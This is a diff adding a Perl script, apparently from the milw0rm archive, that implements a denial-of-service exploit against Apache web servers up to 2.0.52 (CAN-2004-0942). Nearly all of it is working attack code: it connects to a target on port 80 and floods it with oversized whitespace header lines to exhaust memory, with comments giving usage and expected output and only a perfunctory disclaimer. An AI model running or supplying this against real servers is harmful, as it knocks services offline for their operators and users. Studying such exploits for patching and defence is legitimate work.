@@ -1,0 +1,112 @@
+#!/usr/bin/perl
+
+# Based on -> 
+#             apache-squ1rt.c exploit.
+#
+#             Original credit goes to Chintan Trivedi on the
+#             FullDisclosure mailing list:
+#             http://seclists.org/lists/fulldisclosure/2004/Nov/0022.html
+#
+# More info ->
+#   
+#             http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2004-0942
+# Added ->
+#             Added future with we can exploit Apache web servers on windows system. For it you should experiment
+#             with [trys] parameter of this code.
+#             
+#             By default parameter trys = 8000, for DoS Apache web servers on windows system try to 
+#             increase this parameter.
+#
+#             For example. In my system I have 256Mb of RAM. For DoS Apache web severs I run this exploit like this
+#
+#             C:\perl ap2.0.52_dos.pl 127.0.0.1 30000
+#
+#              <+> Prepare to start connect.
+#              <+> Connected to 127.0.0.1
+#              <+> Send of first part of devil header.
+#              <+> Prepare to DoS with 10000 trys.
+#              <+> Start DoS second part of devil header.
+#              <SOD> |====================> <EOD>
+#              <+> Ok now target web server maybe DoSeD.
+#
+#
+# Note ->    
+#           
+#             If progresbar not response server mybe already DoSeD. Try to open web page hosted on this web servers.
+#             And if you see "Eror 500" you are lucky man :)
+#
+# Warnings -> 
+#             This is POC code you can use only on you own servers. Writer don't response if you damadge you servers or
+#             use it for attack, or others things.  
+#
+# Shit -> 
+#             My English now is bulls shit :( I try study it :)
+#            
+
+# Tested under Window 2000 SP4 with Apache 2.0.49 (Win)
+
+# Grests fly to Chintan Trivedi NsT, RST, Void, Unlock and other underground world.
+
+# Contact to me at greenwood3[AT]yandex[dot]ru
+
+use IO::Socket;
+
+if (@ARGV <1)
+  {
+   print "\n ::: ---------------------------------------------- :::\n";
+   print " ::: Another yet DoS exploit for Apache <= 2.0.52   :::\n";
+   print " ::: Usage:  ap2.0.52_dos.pl <ip> [trys]            :::\n";
+   print " ::: Coded by GreenwooD from Network Security Team  :::\n";
+   print " ::: ---------------------------------------------- :::\n";
+   exit();
+  }
+
+print "\n <+> Prepare to start connect.\n";
+
+$s = IO::Socket::INET->new(Proto=>"tcp",
+                            PeerAddr=>$ARGV[0],
+                            PeerPort=>80,
+                            Timeout=>6
+                            ) or die " <-> Target web server already DoSeD ??? or can't connect :(\n";
+  $s->autoflush();
+
+print " <+> Connected to $ARGV[0]\n";
+print " <+> Send of first part of devil header.\n";    
+  
+  print $s "GET / HTTP/1.0\n";
+
+$trys = 8000; # Default
+
+if ($ARGV[1])
+{
+  $trys = $ARGV[1];
+}
+
+print " <+> Prepare to DoS with $trys trys.\n";
+print " <+> Start DoS send second part of devil header.\n";    
+print " <SOD> |";
+
+$i=0;
+
+ do {
+
+     print $s (" " x 8000 . "\n"); 
+
+   
+      if ($i % 500 == 0)
+        { 
+         print "=";
+        }  
+
+     ++$i;
+
+    } until ($i == $trys); 
+
+
+print "> <EOD>\n";
+
+close($s);
+
+print " <+> Ok now target web server maybe DoSeD.\n"; 
+
+# milw0rm.com [2005-03-04]
